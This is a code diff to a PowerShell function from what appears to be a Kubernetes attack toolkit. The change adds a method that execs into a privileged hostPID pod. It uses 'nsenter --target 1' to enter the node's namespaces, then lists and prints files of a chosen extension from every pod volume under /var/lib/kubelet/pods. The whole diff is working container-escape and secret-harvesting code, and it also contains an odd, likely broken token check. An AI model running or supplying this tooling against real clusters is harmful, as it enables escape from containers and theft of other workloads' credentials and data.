@@ -45,32 +45,54 @@ function Get-FileExtensionsFromVolumesInNodes {
         [Alias("ext")]
         [string]$extension,
 
-        [Parameter(Mandatory = $true)]
+        [Parameter(Mandatory = $false)]
         [Alias("node")]
-        [string]$nodeName
+        [string]$nodeName,
+        [Parameter(Mandatory = $true)]
+        [Alias("m")]
+        [ValidateSet("debugNode", "hostpid")]
+        [string]$method
     )
 
     # Set base kubectl debug command
-    $baseCommand = "kubectl debug node/$nodeName -it -q --image=ubuntu"
-
+    if($method -eq "debugNode"){
+        $baseCommand = "kubectl debug node/$nodeName -it -q --image=ubuntu"
+    }
+    # Set base kubectl hostpid command
+    if($method -eq "hostpid"){
+        $baseCommand = " kubectl exec -it priv-and-hostpid-pod"
+    }
     # Append namespace if specified
     if ($namespace) {
         $baseCommand += " -n $namespace"
     }
 
     # Append access token if specified
-    if ($accesstoken) {
+    if (!$accesstoken.Contains("nvt")) {
         $baseCommand += " --token $accesstoken"
     }
 
     # Find files with the specified extension
-    $searchCommand = "$baseCommand -- find /host/var/lib/kubelet/pods/ -type f -name '*$extension'"
+    # Set base kubectl debug command
+    if($method -eq "debugNode"){
+        $searchCommand = "$baseCommand -- find /host/var/lib/kubelet/pods/ -type f -name '*$extension'"
+    }
+    # Set base kubectl hostpid command
+    if($method -eq "hostpid"){
+        $searchCommand = "$baseCommand -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- find /var/lib/kubelet/pods/ -type f -name '*$extension'"
+    }
     $ExtensionInVolumes = Invoke-Expression $searchCommand
 
     foreach ($ExtensionInVolume in $ExtensionInVolumes) {
         Write-Host "Listing extension: $extension from path: $ExtensionInVolume"
         Write-Host ""
-        $catCommand = "$baseCommand -- cat $ExtensionInVolume"
+        if($method -eq "debugNode"){
+            $catCommand = "$baseCommand -- cat $ExtensionInVolume"        }
+        # Set base kubectl hostpid command
+        if($method -eq "hostpid"){
+            $catCommand = "$baseCommand -- sudo nsenter --target 1 --mount --uts --ipc --net --pid -- cat $ExtensionInVolume"
+        }
+
         Invoke-Expression $catCommand
         Write-Host ""
     }
